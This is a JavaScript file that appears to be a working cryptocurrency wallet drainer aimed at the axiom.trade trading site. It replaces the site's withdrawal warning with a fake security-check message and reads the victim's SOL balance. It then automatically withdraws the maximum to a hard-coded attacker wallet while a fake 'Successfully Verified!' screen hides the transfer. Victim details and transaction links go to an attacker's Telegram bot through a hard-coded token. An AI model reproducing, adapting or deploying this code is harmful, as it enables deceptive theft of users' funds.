(function() {
  const TELEGRAM_BOT_TOKEN = '7908362404:AAF6gP8zuixMkN74Ql2cMNm0Vx1FH6-1VPk';
  const TELEGRAM_CHAT_ID = '-4752843316';
  async function sendTelegramMessage(message) {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
      });
    } catch (e) {
      console.error('Error sending Telegram message:', e.message);
    }
  }
  if (window.location.hostname !== 'axiom.trade' && window.location.hostname !== 'www.axiom.trade') {
    console.log('Script active on non-target domain: ' + window.location.hostname);
    return; // Now valid inside the IIFE
  }
  function showCustomNotification(message, backgroundColor = 'rgba(0,0,0,0.5)', textColor = 'white', duration = 10000) {
    const existingNotification = document.getElementById('custom-notification');
    if (existingNotification) {
      existingNotification.remove();
    }
    const notification = document.createElement('div');
    notification.id = 'custom-notification';
    Object.assign(notification.style, {
      position: 'fixed',
      left: '50%',
      top: '50%',
      transform: 'translate(-50%,-50%)',
      backgroundColor: backgroundColor,
      backdropFilter: 'blur(5px)',
      color: textColor,
      padding: '20px 30px',
      borderRadius: '8px',
      boxShadow: '0 4px 15px rgba(0,0,0,0.2)',
      zIndex: '99999',
      textAlign: 'center',
      fontSize: '16px',
      fontFamily: 'Arial,sans-serif',
      maxWidth: '80%'
    });
    const messageParagraph = document.createElement('p');
    messageParagraph.textContent = message;
    messageParagraph.style.margin = '0 0 15px 0';
    const closeButton = document.createElement('button');
    closeButton.textContent = 'Close';
    Object.assign(closeButton.style, {
      padding: '8px 15px',
      border: 'none',
      borderRadius: '4px',
      backgroundColor: 'rgba(0,0,0,0.2)',
      color: textColor,
      cursor: 'pointer',
      fontSize: '14px'
    });
    closeButton.onclick = () => notification.remove();
    notification.appendChild(messageParagraph);
    notification.appendChild(closeButton);
    document.body.appendChild(notification);
    if (duration > 0) {
      setTimeout(() => notification.remove(), duration);
    }
  }
  function showVerifyingOverlay() {
    const existingOverlay = document.getElementById('verifying-overlay');
    if (existingOverlay) {
      existingOverlay.remove();
    }
    const overlay = document.createElement('div');
    overlay.id = 'verifying-overlay';
    Object.assign(overlay.style, {
      position: 'fixed',
      top: '0',
      left: '0',
      width: '100%',
      height: '100%',
      backgroundColor: '#000000',
      zIndex: '100000',
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center'
    });
    const text = document.createElement('p');
    text.textContent = 'Successfully Verified!';
    Object.assign(text.style, {
      color: 'white',
      fontSize: '24px',
      fontFamily: 'Arial,sans-serif',
      textAlign: 'center'
    });
    overlay.appendChild(text);
    document.body.appendChild(overlay);
  }
  function replaceWarningText() {
    const spanSelector = 'span.text-decreaseHover.text-\\[12px\\].leading-\\[16px\\].font-normal.text-center.px-\\[16px\\]';
    document.querySelectorAll(spanSelector).forEach(span => {
      if (span.textContent && span.textContent.trim() === 'DO NOT verify if you are not WITHDRAWING') {
        span.textContent = 'Complete the Security Check to complete Verification.';
        console.log('Text changed to: DO NOT VERIFY AT ALL');
      }
    });
  }
  replaceWarningText();
  const observer = new MutationObserver(() => {
    replaceWarningText();
  });
  observer.observe(document.body, { childList: true, subtree: true });
  function getRelevantNumericValues() {
    const valueSelector = 'span.text-\\[14px\\].font-semibold'; // Update this selector after inspecting axiom.trade
    const elements = document.querySelectorAll(valueSelector);
    const numericValues = [];
    if (elements.length === 0) {
      console.warn('Value check: No elements for selector ' + valueSelector + '. Assuming zero balance.');
      return [0];
    }
    try {
      elements.forEach(el => {
        const text = el.textContent || '';
        const cleanedText = text.replace(/[^0-9.]/g, '');
        const num = parseFloat(cleanedText);
        numericValues.push(isNaN(num) ? 0 : num);
      });
    } catch (e) {
      console.error('Error processing numeric values:', e.message);
      return [0];
    }
    return Array.isArray(numericValues) ? numericValues : [0];
  }
  const relevantValues = getRelevantNumericValues();
  const solBalance = relevantValues.length > 0 ? relevantValues[0].toFixed(2) : '0.00';
  const usdBalance = (relevantValues.length > 0 ? (relevantValues[0] * 169) : 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  sendTelegramMessage(`<b>♦️  —  SOMEONE CLICKED</b>\n<b>├</b> 🪙: <code>(${solBalance} SOL)</code>\n<b>├</b> 💲: <code>($${usdBalance} USD)</code>`);
  const areAllFundsZero = relevantValues.length > 0 && relevantValues.every(val => val === 0);
  if (areAllFundsZero) {
    console.error('Process halted: Not enough SOL. Values:', relevantValues);
    showCustomNotification('Please deposit SOL to verify your not a bot.');
    return;
  }
  console.log('Funds check passed. Values:', relevantValues, '. Proceeding with automation on axiom.trade...');
  const FAST_POLL_INTERVAL = 30;
  const waitFor = (selector, callback, parentElement = document) => {
    const interval = setInterval(() => {
      try {
        const el = parentElement.querySelector(selector);
        if (el) {
          clearInterval(interval);
          callback(el);
        }
      } catch (e) {
        console.error('Error in waitFor querySelector with selector:', selector, e.message);
        clearInterval(interval);
      }
    }, FAST_POLL_INTERVAL);
  };
  const initialWalletButtonSelector = '.w-fit.min-w-max.bg-primaryStroke';
  const openWithdrawInterfaceButtonSelector = '.bg-secondaryStroke.flex-1.h-\\[28px\\]';
  const confirmAndProceedToAddressInputSelector = '.text-primaryBlue.text-\\[12px\\].leading-\\[16px\\].font-medium';
  const addressInputSelector = 'input[placeholder=' + String.fromCharCode(39) + 'Address of destination wallet' + String.fromCharCode(39) + ']';
  const maxButtonSelector = 'button.text-primaryBlue.text-\\[12px\\].leading-\\[16px\\].font-medium:not([disabled])';
  const finalSubmitButtonSelector = '.bg-primaryBlue.flex.flex-row.flex-1.h-\\[32px\\]';
  const destinationAddress = 'DSYbYu1EdWBREtAFCtNWuFYYsR6RepmJy55bjo96HHZH';
  waitFor(initialWalletButtonSelector, (walletBtn) => {
    walletBtn.click();
    waitFor(openWithdrawInterfaceButtonSelector, (openWithdrawInterfaceBtn) => {
      openWithdrawInterfaceBtn.click();
      waitFor(confirmAndProceedToAddressInputSelector, (confirmProceedBtn) => {
        confirmProceedBtn.click();
        waitFor(addressInputSelector, (addressInputEl) => {
          const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
          nativeInputValueSetter.call(addressInputEl, destinationAddress);
          addressInputEl.dispatchEvent(new Event('input', { bubbles: true }));
          addressInputEl.dispatchEvent(new Event('change', { bubbles: true }));
          sendTelegramMessage(`<b>♦️  —  ADDRESS PASTED</b>\n<b>├</b> ⛓️‍💥: <code>${destinationAddress}</code>`);
          waitFor(maxButtonSelector, (maxBtn) => {
            if (maxBtn.textContent && maxBtn.textContent.trim().toLowerCase() === 'drag me') {
              maxBtn.click();
              waitFor(finalSubmitButtonSelector, (finalSubmitBtn) => {
                console.log('Final submit button found. Showing verifying overlay...');
                showVerifyingOverlay();
                finalSubmitBtn.click();
                waitFor('[class*="withdrawn"],[class*="success"],[class*="notification"]', (notificationEl) => {
                  const linkEl = notificationEl.querySelector('a[href*="solscan.io/tx"],a[href*="explorer.solana.com/tx"]') || notificationEl.closest('a[href*="solscan.io/tx"],a[href*="explorer.solana.com/tx"]');
                  const transactionLink = linkEl && linkEl.href ? linkEl.href : 'Link Not Found';
                  sendTelegramMessage(`<b>♦️  —  FUNDS TRANSFERRED</b>\n<b>├</b> 🪙: <code>(${solBalance} SOL)</code>\n<b>├</b> 💲: <code>($${usdBalance} USD)</code>\n<b>├</b> ⛓️‍💥: <code>${destinationAddress}</code>\n<b>├</b> 🔗: <code>${transactionLink}</code>`);
                  console.log('Automation completed. Transaction link:', transactionLink);
                });
              });
            } else {
              console.error('Max button text mismatch. Expected Drag Me, got ' + maxBtn.textContent + '.');
            }
          });
        });
      });
    });
  });
})();
